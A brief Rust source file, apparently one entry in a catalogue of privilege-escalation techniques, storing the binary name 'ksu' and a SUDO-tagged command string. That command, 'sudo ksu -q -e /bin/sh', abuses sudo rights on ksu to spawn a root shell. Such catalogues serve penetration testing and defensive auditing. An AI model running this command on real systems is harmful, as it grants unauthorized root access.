pub static BIN_NAME: &'static str = "ksu";
pub static SUDO_CODE: &'static str = r#"
    
    sudo ksu -q -e /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
